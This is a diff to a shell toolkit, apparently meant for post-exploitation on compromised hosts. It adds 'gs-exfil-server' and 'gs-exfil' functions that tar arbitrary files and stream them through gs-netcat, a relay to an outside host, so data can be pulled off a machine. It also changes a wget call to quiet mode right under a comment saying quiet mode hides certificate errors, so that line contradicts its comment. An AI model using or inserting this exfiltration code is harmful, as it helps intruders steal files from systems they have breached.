@@ -1345,6 +1345,29 @@ memdump() {
     done
 }
 
+gs-exfil-server() {
+    _hs_dep gs-netcat
+    _hs_dep tar
+    local s=$(gs-netcat -g)
+
+    echo -e "Transfer files with: ${CDC}SECRET=${s} gs-exfil <files>${CN}"
+    while :; do
+        gs-netcat -s "$s" -lr | tar --same-owner --preserve-permissions -xzvf -
+        sleep 5
+    done
+}
+
+gs-exfil() {
+    _hs_dep gs-netcat
+    _hs_dep tar
+    [ -z "$SECRET" ] && {
+        echo >&2 "Usage: Execute 'gs-exfil-server' on any server first."
+        return 255
+    }
+
+    tar -czvf - "$@" | gs-netcat -s "$SECRET"
+}
+
 # <pid> <string-pattern>
 # - on Read-only sections (.text, .rodata) of the process memory
 # - Fixed string pattern match only
@@ -2204,7 +2227,7 @@ hs_init_dl() {
             local opts=()
             [ -n "$UNSAFE" ] && opts=("--no-check-certificate")
             # Can not use '-q' here because that also silences SSL/Cert errors
-            wget -O- "${opts[@]}" "${_HS_WGET_OPTS[@]}" "${1:?}"
+            wget -qO- "${opts[@]}" "${_HS_WGET_OPTS[@]}" "${1:?}"
         }
     elif [ -n "$HS_PY" ]; then
         dl() { purl "$@"; }
